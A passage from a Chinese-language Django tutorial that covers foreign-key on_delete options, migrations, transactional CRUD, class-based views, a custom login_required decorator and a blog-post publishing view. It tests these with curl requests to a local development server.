<li>models.SET_DEFAULT: 将外键设置为其默认值;必须为外键设置默认值。</li>
<li>models.DO_NOTHING: 不采取任何行动。如果数据库后端强制执行引用完整性，这将导致IntegrityError，除非手动向数据库字段添加一个SOL ON DELETE约束。</li>
<li>在Django2.0开始，on_delete必须提供，参考<a href="https://docs.djangoproject.com/en/5.2/ref/models/fields/#django.db.models.ForeignKey.on_delete">https://docs.djangoproject.com/en/5.2/ref/models/fields/#django.db.models.ForeignKey.on_delete</a></li>
</ol>


<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#21024;&#38500;&#33258;&#24049;&#21019;&#24314;&#30340;&#34920;post, content. &#29983;&#25104;&#26032;&#30340;&#34920;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20934;&#22791;&#36801;&#31227;&#34920;</span>
(.venv) PS D:\project\pyprojs\trae\blog10&gt; python manage.py makemigrations
Migrations for <span style="color: #8b2252;">'post'</span>:
  post\migrations\0001_initial.py
    + Create model Post
    + Create model Content


<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36801;&#31227;</span>
(.venv) PS D:\project\pyprojs\trae\blog10&gt; python manage.py migrate       
Operations to perform:
  Apply all migrations: admin, auth, contenttypes, post, sessions
Running migrations:
  Applying post.0001_initial... OK

CREATE TABLE <span style="color: #ff00ff;">`blog2`</span><span style="color: #483d8b;">.</span><span style="color: #ff00ff;">`post`</span>  (
  <span style="color: #ff00ff;">`id`</span> bigint(0) NOT NULL AUTO_INCREMENT,
  <span style="color: #ff00ff;">`title`</span> varchar(256) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  <span style="color: #ff00ff;">`postdate`</span> datetime(6) NOT NULL,
  <span style="color: #ff00ff;">`author_id`</span> int(0) NOT NULL,
  PRIMARY KEY (<span style="color: #ff00ff;">`id`</span>) USING BTREE,
  INDEX <span style="color: #ff00ff;">`post_author_id_2343ddae_fk_auth_user_id`</span>(<span style="color: #ff00ff;">`author_id`</span>) USING BTREE,
  CONSTRAINT <span style="color: #ff00ff;">`post_author_id_2343ddae_fk_auth_user_id`</span> FOREIGN KEY (<span style="color: #ff00ff;">`author_id`</span>) REFERENCES <span style="color: #ff00ff;">`blog2`</span><span style="color: #483d8b;">.</span><span style="color: #ff00ff;">`auth_user`</span> (<span style="color: #ff00ff;">`id`</span>) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;

CREATE TABLE <span style="color: #ff00ff;">`blog2`</span><span style="color: #483d8b;">.</span><span style="color: #ff00ff;">`content`</span>  (
  <span style="color: #ff00ff;">`post_id`</span> bigint(0) NOT NULL,
  <span style="color: #ff00ff;">`content`</span> longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NULL,
  PRIMARY KEY (<span style="color: #ff00ff;">`post_id`</span>) USING BTREE,
  CONSTRAINT <span style="color: #ff00ff;">`content_post_id_c6de7cfd_fk_post_id`</span> FOREIGN KEY (<span style="color: #ff00ff;">`post_id`</span>) REFERENCES <span style="color: #ff00ff;">`blog2`</span><span style="color: #483d8b;">.</span><span style="color: #ff00ff;">`post`</span> (<span style="color: #ff00ff;">`id`</span>) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_0900_ai_ci ROW_FORMAT = Dynamic;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6ae72b57-ab96-46d7-a6fd-2d5f686e25d7" class="outline-3">
<h3 id="h:6ae72b57-ab96-46d7-a6fd-2d5f686e25d7">模型操作</h3>
<div class="outline-text-3" id="text-h:6ae72b57-ab96-46d7-a6fd-2d5f686e25d7">
<p>
支持事务：<a href="https://docs.djangoproject.com/en/5.2/topics/db/transactions/#controlling-transactions-explicitly">https://docs.djangoproject.com/en/5.2/topics/db/transactions/#controlling-transactions-explicitly</a>
</p>

<p>
测试，项目根目录下创建 t.py文件
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;">#</span><span style="color: #b22222;">t.py &#27979;&#35797;&#22686;&#21024;&#25913;, &#22810;&#34920;&#20851;&#32852;</span>
<span style="color: #a020f0;">import</span> os
<span style="color: #a020f0;">import</span> django
<span style="color: #a020f0;">from</span> django.core.wsgi <span style="color: #a020f0;">import</span> get_wsgi_application

os.environ.setdefault(<span style="color: #8b2252;">'DJANGO_SETTINGS_MODULE'</span>, <span style="color: #8b2252;">'blog.settings'</span>)
django.setup()

<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> post.models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #b22222;"># </span><span style="color: #b22222;">ps = Post.objects.all()</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">print(ps)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22686;&#21024;&#25913;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">post&#23545;&#35937;&#65292;&#22914;&#26524;&#27809;&#26377;&#25351;&#23450;id&#65292;save&#19968;&#23450;&#26159;&#26032;&#22686;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;post&#23545;&#35937;&#25351;&#23450;&#20102;id&#65292;&#25968;&#25454;&#24211;&#20013;&#27809;&#26377;&#23545;&#24212;&#30340;&#35760;&#24405;&#23601;&#26159;&#26032;&#22686;&#65307;&#22914;&#26524;&#26377;id&#65292;&#23545;&#24212;&#25968;&#25454;&#24211;&#35760;&#24405;&#23601;&#26159;&#20462;&#25913;</span>
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic

<span style="color: #a020f0;">try</span>: <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;&#65292;&#23384;&#22312;&#30340;&#25345;&#20037;&#21270;&#20102;&#30340;&#25968;&#25454;&#36827;&#34892;&#20462;&#25913;&#65292;&#20808;&#26597;&#21518;&#20462;&#25913;</span>
    <span style="color: #a0522d;">post</span> = Post.objects.<span style="color: #483d8b;">filter</span>(pk=<span style="color: #8b2252;">'5'</span>).first()
    <span style="color: #a020f0;">if</span> post:
        <span style="color: #483d8b;">print</span>(post, post.pk, post.<span style="color: #483d8b;">id</span>)
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26356;&#26032;</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">post.save()</span>
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;</span>
        <span style="color: #a020f0;">with</span> atomic(): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20107;&#21153;</span>
            <span style="color: #b22222;"># </span><span style="color: #b22222;">print(post.content.content)</span>
            post.content.delete() <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21024;&#38500;&#20174;&#34920;content&#35760;&#24405;</span>
            post.delete()
<span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
    <span style="color: #483d8b;">print</span>(e)

<span style="color: #b22222;"># </span><span style="color: #b22222;">try: # &#25209;&#37327;&#26356;&#26032;&#65292;&#38750;&#24120;&#21361;&#38505;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">ret = Post.objects.filter(id__gt=3).update(author=1)</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(ret)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">except Exception as e:</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(e)</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">try: # &#25209;&#37327;&#21024;&#38500;&#65292;&#38750;&#24120;&#21361;&#38505;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">ret = Post.objects.filter(id__gt=3).delete()</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(ret)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">except Exception as e:</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(e)</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">post = Post()</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">try: # &#26032;&#22686;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;"># post.id = 100 # insert_into &#35201;&#19981;&#35201;&#25351;&#23450;id&#65292;&#30001;&#20110;&#26159;&#26032;&#22686;&#19988;&#23383;&#27573;&#26159;&#33258;&#22686;&#65292;&#25152;&#20197;&#21487;&#20197;&#19981;&#25351;&#23450;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">post.title = 't6'</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">post.postdata = datetime.datetime.now(</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;">datetime.timezone(datetime.timedelta(hours=8))</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">)</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;"># &#20316;&#32773;&#24590;&#20040;&#21150;&#65311;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;"># post.author = 1 # Cannot assign "1": "Post.author" must be a "User" instance.</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">post.author_id = 1</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;"># &#20869;&#23481;&#24590;&#20040;&#21150;&#65292;&#21487;&#20197;&#19981;&#20889;&#20869;&#23481;&#21527;&#65311; &#21487;&#20197;</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">c = Content()</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">c.content = '&#20869;&#23481;6'</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">with atomic():</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;">post.save() # &#25345;&#20037;&#21270;&#65292;&#25104;&#21151;&#25552;&#20132;&#65292;&#22833;&#36133;&#22238;&#28378;</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;"># c.post_id = post.id #&#20063;&#21487;&#20197;&#20351;&#29992; c.post = post &#33258;&#21160;&#23436;&#25104;id&#21305;&#37197;</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;">c.post = post</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;">1/0</span>
<span style="color: #b22222;">#         </span><span style="color: #b22222;">c.save()</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(post.pk)</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">except Exception as e:</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(e)</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print('=' * 30)</span>
<span style="color: #b22222;">#     </span><span style="color: #b22222;">print(post.pk)</span>
</pre>
</div>

<p>
post视图函数
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889;</span>
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'method'</span>:<span style="color: #8b2252;">'get'</span>})
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">title</span> = payload[<span style="color: #8b2252;">'title'</span>]
            <span style="color: #a0522d;">C</span> = payload[<span style="color: #8b2252;">'content'</span>]
            <span style="color: #a0522d;">post</span> = Post(title=title)
            <span style="color: #a0522d;">content</span> = Content()

            post.<span style="color: #a0522d;">postdate</span> = datetime.datetime.now(
                datetime.timezone(datetime.timedelta(hours=8))
            )
            <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2 #request.user.id</span>
            post.<span style="color: #a0522d;">author</span> = request.user
            content.<span style="color: #a0522d;">content</span> = C

            <span style="color: #a020f0;">with</span> atomic():
                post.save()
                content.<span style="color: #a0522d;">post</span>  = post
                content.save()


            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
                <span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>
            }})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">postman &#20808;&#30331;&#24405;&#33719;&#24471;cookie</span>
curl --location <span style="color: #8b2252;">'127.0.0.1:8000/users/login'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=7hsr74c0kyea9zynk1gbjxm3qdb8jvhl'</span> <span style="color: #8b2252;">\</span>
--data-raw <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "username":"abc",</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "email":"abc@abc.com"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">postman &#25552;&#20132;&#25991;&#31456;&#20449;&#24687;</span>
curl --location <span style="color: #8b2252;">'127.0.0.1:8000/posts/'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=7hsr74c0kyea9zynk1gbjxm3qdb8jvhl'</span> <span style="color: #8b2252;">\</span>
--data <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "title":"t200",</span>
<span style="color: #8b2252;">    "content":"nr200"</span>
<span style="color: #8b2252;">}'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:77e53b48-e002-478c-b5e4-2a38c57280ab" class="outline-3">
<h3 id="h:77e53b48-e002-478c-b5e4-2a38c57280ab">视图分类</h3>
<div class="outline-text-3" id="text-h:77e53b48-e002-478c-b5e4-2a38c57280ab">
<ol class="org-ol">
<li>function-based view 视图函数：视图功能有函数实现</li>
<li>class-based view 视图类：视图功能有基于django.views.View类的子类实现</li>
</ol>
</div>
<div id="outline-container-h:82e6cf6f-262f-4e49-92a0-d1e8218c4175" class="outline-4">
<h4 id="h:82e6cf6f-262f-4e49-92a0-d1e8218c4175">django.views.View类原理</h4>
<div class="outline-text-4" id="text-h:82e6cf6f-262f-4e49-92a0-d1e8218c4175">
<ul class="org-ul">
<li>django.views.View类本质就是一个对请求方法分发到与请求方法同名函数的调度器。</li>
<li>django.views.View类，定义了http的方法的小写名称列表，这些小写名称其实就是处理请求的方法名的小写。</li>
<li>as_views()方法就是返回一个内建的view(request,*args,**kwargs)函数，本质上其实还是url映射到了函数上，只不过view函数内部会调用dispatch(request,*args,**kwargs)分发函数。</li>
<li>dispatch函数中使用request对象的请求方法小写和http_method_names中允许的HTTP方法匹配，匹配说明是正确的HTTP请求方法，然后尝试再View子类中找该方法，调用后返回结果。找不到该名称方法，就执行http_method_not_allowed方法返回405状态码
<ul class="org-ul">
<li>看到了getattr等反射函数，说明基于反射实现的。</li>
</ul></li>
<li>as_view()方法，用在url映射配置中
<ol class="org-ol">
<li>本质上，as_view()方法还是把一个类伪装成了一个视图函数。</li>
<li>这个视图函数，内部使用了一个分发函数，使用请求方法名称吧请求分发给存在的同名函数处理。</li>
</ol></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:0f4f35b2-83fd-441f-89c5-4b74f241ef28" class="outline-3">
<h3 id="h:0f4f35b2-83fd-441f-89c5-4b74f241ef28">认证装饰器进阶</h3>
<div class="outline-text-3" id="text-h:0f4f35b2-83fd-441f-89c5-4b74f241ef28">
<p>
Django提供的内建的视图用的装饰器，个人认为并不好用，它能很好的适合视图函数，但是不能直接用在视图类的方法上，归根结底就是View类中方法self的问题。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20462;&#25913;post/urls.py&#25991;&#20214;</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> PostView, getpost
<span style="color: #a020f0;">from</span> user.views <span style="color: #a020f0;">import</span> login_required

<span style="color: #b22222;">#</span><span style="color: #b22222;">path('path', &#20989;&#25968;&#25110;&#19977;&#20803;&#32452;)</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">as_view&#24403;&#20570;&#35270;&#22270;&#20989;&#25968;&#65292;&#22312;&#20869;&#37096;&#19968;&#23450;&#35201; &#26681;&#25454;method&#21028;&#26029;&#25214;&#21040;&#23545;&#21516;&#21517;&#22788;&#29702;&#26041;&#27861;</span>
<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, login_required(PostView.as_view())), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/ POST GET &#21338;&#25991;&#30340;&#22686;&#21152;&#12289;&#26597;&#35810;</span>
    path(<span style="color: #8b2252;">'&lt;int:id&gt;'</span>, getpost), <span style="color: #b22222;"># </span><span style="color: #b22222;">/post/123</span>
]
</pre>
</div>

<p>
但是上面这种方式适合把PostView类所有方法都认证，但是实际上就ipost方法要认证。所以authenticate还是需要加载到post方法上去。因此，要修改login_required函数。
</p>

<p>
前面自己实现的login_required装饰器，默认对所有请求不论什么方法都要认证，但是在View中要对部分方法不要认证，这就是要例外。为了和前面保持兼容，但是又要提供新的排除参数，就必须采用一些代码技巧实现。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">user/views.py</span>
...
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">login_required</span>(exclude_methods):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">_login_required</span>(viewfunc):
        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21442;&#29031;django.contrib.auth.decorators.login_required</span>
        <span style="color: #228b22;">@wraps</span>(viewfunc)
        <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(request, *args, **kwars):
            <span style="color: #a0522d;">method</span> = request.method.lower()
            <span style="color: #a020f0;">if</span> method <span style="color: #a020f0;">in</span> exclude_methods:
                <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
            <span style="color: #a020f0;">else</span>:
                <span style="color: #a020f0;">if</span> request.user.is_authenticated:
                    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#35748;&#35777;&#20102;'</span>)
                    <span style="color: #a020f0;">return</span> viewfunc(request, *args, **kwars)
                <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#26410;&#35748;&#35777;&#36890;&#36807;'</span>)
                <span style="color: #a020f0;">return</span> HttpResponse(status=401)
        <span style="color: #a020f0;">return</span> wrapper
    <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">callable</span>(exclude_methods): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#20860;&#23481;&#20043;&#21069;&#35843;&#29992;&#65292;&#22914;&#26524;&#26159;&#26080;&#21442;&#35843;&#29992;&#23601;&#26159;&#20989;&#25968;&#65292;&#24110;&#23427;&#24448;&#37324;&#38754;&#35843;&#29992;&#19968;&#23618;&#36820;&#22238;</span>
        <span style="color: #a0522d;">fn</span> = exclude_methods
        <span style="color: #a0522d;">exclude_methods</span> = () <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;&#27809;&#20160;&#20040;&#26041;&#27861;method&#35201;&#25490;&#38500;&#65292;&#37117;&#35201;&#35748;&#35777;</span>
        <span style="color: #a020f0;">return</span> _login_required(fn)
    <span style="color: #a020f0;">return</span> _login_required
...
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/urls.py</span>
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path
<span style="color: #a020f0;">from</span> .views <span style="color: #a020f0;">import</span> PostView, getpost
<span style="color: #a020f0;">from</span> user.views <span style="color: #a020f0;">import</span> login_required

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">''</span>, login_required([<span style="color: #8b2252;">'get'</span>])(PostView.as_view())), <span style="color: #b22222;"># </span><span style="color: #b22222;">&#25490;&#38500;get&#26041;&#27861;&#65292;get&#26041;&#27861;&#19981;&#35748;&#35777;</span>
    path(<span style="color: #8b2252;">'&lt;int:id&gt;'</span>, getpost), <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts/123</span>
]
</pre>
</div>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889;</span>
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'method'</span>:<span style="color: #8b2252;">'get'</span>})
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">title</span> = payload[<span style="color: #8b2252;">'title'</span>]
            <span style="color: #a0522d;">C</span> = payload[<span style="color: #8b2252;">'content'</span>]
            <span style="color: #a0522d;">post</span> = Post(title=title)
            <span style="color: #a0522d;">content</span> = Content()

            post.<span style="color: #a0522d;">postdate</span> = datetime.datetime.now(
                datetime.timezone(datetime.timedelta(hours=8))
            )
            <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2 #request.user.id</span>
            post.<span style="color: #a0522d;">author</span> = request.user
            content.<span style="color: #a0522d;">content</span> = C

            <span style="color: #a020f0;">with</span> atomic():
                post.save()
                content.<span style="color: #a0522d;">post</span>  = post
                content.save()
            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
                <span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>
            }})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(<span style="color: #483d8b;">id</span>), <span style="color: #483d8b;">id</span>)
    <span style="color: #a020f0;">return</span> JsonResponse({})
</pre>
</div>
</div>
</div>
<div id="outline-container-h:2a36bad0-198d-4d4b-9229-2376d89609ee" class="outline-3">
<h3 id="h:2a36bad0-198d-4d4b-9229-2376d89609ee">发布接口实现</h3>
<div class="outline-text-3" id="text-h:2a36bad0-198d-4d4b-9229-2376d89609ee">
<p>
request(POST {title, content}) -&gt; [login_required] view -&gt; response({new id})
</p>

<p>
浏览器端采用POST方法提交数据到服务器端，服务器端成功认证用户身份后交给view函数处理，返回给用户新增的id。
</p>

<p>
认证失败后，返回状态码401，浏览器端代码收到这个状态码会会跳转到登录页。
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">post/views.py</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, JsonResponse, HttpRequest
<span style="color: #a020f0;">from</span> django.views <span style="color: #a020f0;">import</span> View
<span style="color: #a020f0;">import</span> simplejson
<span style="color: #a020f0;">from</span> .models <span style="color: #a020f0;">import</span> Post, Content
<span style="color: #a020f0;">import</span> datetime
<span style="color: #a020f0;">from</span> django.db.transaction <span style="color: #a020f0;">import</span> atomic
<span style="color: #a020f0;">from</span> messages <span style="color: #a020f0;">import</span> Messages

<span style="color: #a020f0;">class</span> <span style="color: #228b22;">PostView</span>(View):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26041;&#27861;&#21517;&#19968;&#23450;&#35201;&#23567;&#20889;. &#25991;&#31456;&#21015;&#34920;</span>
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'method'</span>:<span style="color: #8b2252;">'get'</span>})
    <span style="color: #b22222;"># </span><span style="color: #b22222;">&#24517;&#39035;&#30331;&#24405;</span>
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">post</span>(<span style="color: #a020f0;">self</span>, request): <span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#27809;&#26377;post&#20989;&#25968;&#65292;POST&#35831;&#27714;&#26080;&#27861;&#23545;&#24212;&#65292;&#36820;&#22238;405&#12290; &#21457;&#24067;</span>
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a0522d;">payload</span> = simplejson.loads(request.body)
            <span style="color: #a0522d;">title</span> = payload[<span style="color: #8b2252;">'title'</span>]
            <span style="color: #a0522d;">C</span> = payload[<span style="color: #8b2252;">'content'</span>]
            <span style="color: #a0522d;">post</span> = Post(title=title)
            <span style="color: #a0522d;">content</span> = Content()

            post.<span style="color: #a0522d;">postdate</span> = datetime.datetime.now(
                datetime.timezone(datetime.timedelta(hours=8))
            )
            <span style="color: #b22222;"># </span><span style="color: #b22222;">post.author_id = 2 #request.user.id</span>
            post.<span style="color: #a0522d;">author</span> = request.user
            content.<span style="color: #a0522d;">content</span> = C

            <span style="color: #a020f0;">with</span> atomic():
                post.save()
                content.<span style="color: #a0522d;">post</span>  = post
                content.save()
            <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
                <span style="color: #8b2252;">'id'</span>:post.<span style="color: #483d8b;">id</span>
            }})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">type</span>(<span style="color: #483d8b;">id</span>), <span style="color: #483d8b;">id</span>)
    <span style="color: #a020f0;">return</span> JsonResponse({})
</pre>
</div>

<p>
测试时，先登录拿到session，再提交博文
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;postman&#24037;&#20855;&#25805;&#20316;&#12290;&#20808;&#30331;&#24405;&#65292;&#20877;&#25552;&#20132;&#21338;&#25991;</span>
curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/users/login'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Content-Type: application/json'</span> <span style="color: #8b2252;">\</span>
--header <span style="color: #8b2252;">'Cookie: sessionid=wh0l46w101gre1z9ytoo6vjyvzfr4z6h'</span> <span style="color: #8b2252;">\</span>
--data <span style="color: #8b2252;">'{</span>
<span style="color: #8b2252;">    "password":"abc",</span>
<span style="color: #8b2252;">    "username":"abc"</span>
<span style="color: #8b2252;">}</span>
<span style="color: #8b2252;">'</span>
curl --location <span style="color: #8b2252;">'http://127.0.0.1:8000/posts/'</span> <span style="color: #8b2252;">\</span>
